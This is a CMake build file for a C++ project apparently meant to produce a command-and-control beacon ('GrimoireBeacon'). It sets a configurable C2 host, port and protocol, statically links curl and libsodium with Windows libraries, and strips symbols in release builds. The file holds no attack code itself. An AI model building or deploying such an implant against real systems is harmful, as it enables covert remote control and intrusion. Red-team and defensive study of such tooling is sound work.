cmake_minimum_required(VERSION 3.10)
project(GrimoireBeacon CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)

set(LIB_DIR "${CMAKE_CURRENT_SOURCE_DIR}/libs/x64")

add_executable(GrimoireBeacon
        main.cpp
        GrimoireAgent.cpp
        GrimoireComms.cpp
        GrimoireCrypto.cpp
        Utils.cpp
        GrimoireConfig.cpp
)

# 配置 C2
set(C2_HOST_CONFIG "127.0.0.1" CACHE STRING "C2 Host IP or Domain Name")
set(C2_PORT_CONFIG "8080" CACHE STRING "C2 PORT")
set(C2_PROTOCOL_CONFIG "http://" CACHE STRING "C2 PROTOCOL")

target_include_directories(GrimoireBeacon PRIVATE
        "${CMAKE_CURRENT_SOURCE_DIR}/libs/include"
)

target_compile_definitions(GrimoireBeacon PRIVATE
        CURL_STATICLIB
        SODIUM_STATIC
        GRIMOIRE_C2_HOST="${C2_HOST_CONFIG}"
        GRIMOIRE_C2_PORT="${C2_PORT_CONFIG}"
        GRIMOIRE_C2_PROTOCOL="${C2_PROTOCOL_CONFIG}"
)

target_link_libraries(GrimoireBeacon PRIVATE
        "${LIB_DIR}/libcurl.a"
        "${LIB_DIR}/libsodium.a"
        ws2_32
        crypt32
        advapi32
        secur32
        bcrypt
        iphlpapi
)

target_link_options(GrimoireBeacon PRIVATE
        -static-libgcc
        -static-libstdc++
)

if(NOT CMAKE_BUILD_TYPE STREQUAL "Debug")
    target_link_options(GrimoireBeacon PRIVATE "-Wl,--strip-all")
endif()